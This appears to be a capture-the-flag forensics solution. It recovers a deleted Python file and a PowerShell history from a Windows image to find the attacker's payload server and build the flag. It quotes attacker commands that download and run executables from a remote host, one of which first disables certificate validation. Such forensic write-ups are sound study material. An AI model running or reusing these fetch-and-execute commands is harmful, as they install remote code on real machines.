# Solution

``` bash
# we find the deleted files
$ ls targets/C/\$Recycle.Bin/S-1-5-21-3757327896-2532397730-150904874-1001/
'$IB3CC5R.py'  '$RB3CC5R.py'
$ cat ../broken-seal/targets/C/\$Recycle.Bin/S-1-5-21-3757327896-2532397730-150904874-1001/\$RB3CC5R.py
[..]
download_url = "https://192.168.181.159:8888/payload?payloadId=67"

# or we find the powershell history
cat ../broken-seal/targets/C/users/test1/Appdata/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt
[..]
curl.exe -k "https://192.168.181.159:8888/payload?payloadId=64" -o notepatch.exe && notepatch.exe
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://192.168.181.159:8888/payload?payloadId=66', "$HOME\bitmorph.exe"); Start-Process "$HOME\bitmorph.exe"

# build the flag as instructed
SSS{192.168.181.159:8888/payload}
```
